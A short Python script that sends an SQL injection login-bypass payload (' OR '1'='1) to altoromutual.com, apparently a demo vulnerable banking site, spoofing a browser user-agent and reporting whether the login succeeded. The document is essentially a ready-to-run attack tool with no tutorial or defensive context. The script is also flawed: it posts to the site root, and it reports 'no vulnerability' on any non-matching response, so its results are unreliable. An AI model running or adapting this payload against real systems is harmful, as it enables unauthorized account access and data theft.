import requests
from requests.exceptions import ConnectionError, Timeout, TooManyRedirects

# Define the target URL
url = "http://altoromutual.com"
username = "admin"  # The known username or placeholder
password = ""        # The password to be used for SQL injection (usually empty)

# SQL Injection payload
payload = "' OR '1'='1"  # This is just an example and may not work as intended

# Headers to mimic a browser request
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
}

# Prepare the data dictionary if needed for a POST request
data = {
    "username": username,
    "password": payload
}

try:
    # Send the HTTP POST request to the login page
    response = requests.post(url, headers=headers, data=data)
    
    # Check if the response indicates a successful SQL injection
    if "Welcome" in response.text or "Logged in successfully" in response.text:
        print("SQL Injection Successful!")
    else:
        print("No SQL Injection vulnerability detected.")
except ConnectionError as e:
    print("Error connecting to the server: ", str(e))
except Timeout as e:
    print("Timeout occurred when sending data to the server: ", str(e))
except TooManyRedirects as e:
    print("Too many redirects error: ", str(e))